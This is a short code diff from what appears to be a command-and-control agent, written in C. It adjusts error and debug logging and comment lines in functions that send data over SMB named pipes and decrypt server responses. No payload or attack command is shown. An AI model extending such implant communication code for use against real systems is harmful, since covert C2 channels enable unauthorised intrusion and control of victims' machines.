@@ -225,6 +225,7 @@ BOOL PackageSendPipe(HANDLE hPipe, PVOID Buffer, SIZE_T Length)
 
     do {
         if ( !WriteFile(hPipe, Buffer + Total, MIN( ( Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL) ) {
+            _err("WriteFile failed. ERROR : %d", GetLastError());
             return FALSE;
         }
 
@@ -328,7 +329,6 @@ BOOL PackageSend(PPackage package, PPARSER response)
     // TODO remove comment
     // In the case where SMB receive doesnt return anything
     if (pOutData == NULL || sOutLen == 0) {
-        _dbg("No response from server. Continuing...");
         return TRUE;
     }
 
@@ -373,12 +373,10 @@ BOOL PackageSend(PPackage package, PPARSER response)
     _dbg("Decrypted Response");
     print_bytes(response->Buffer, response->Length);
     
-    // UINT32 hasDelegates = ParserGetInt32(response);
-    // BYTE hasDelegates = ParserGetByte(response);
-    // _dbg("Contains Delegates : %s", hasDelegates ? "TRUE" : "FALSE");
 
-    // if ( hasDelegates ) then NumOfDelegates
-    // for Msg in NumOfDelegates, 
+    // BOOL isDelegates = (BOOL)ParserGetByte(&Response);
+    // _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
+
 
     bStatus = TRUE;
 
